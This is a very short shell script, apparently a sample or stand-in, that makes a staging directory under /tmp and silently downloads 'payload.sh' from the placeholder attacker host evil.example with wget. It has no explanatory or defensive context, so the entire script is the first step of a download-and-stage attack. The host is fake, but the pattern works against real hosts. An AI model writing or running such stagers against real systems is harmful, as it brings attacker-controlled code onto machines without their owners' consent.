#!/bin/sh
DEST=/tmp/stage
mkdir -p "$DEST"
wget -q https://evil.example/payload.sh -O "$DEST/payload.sh"
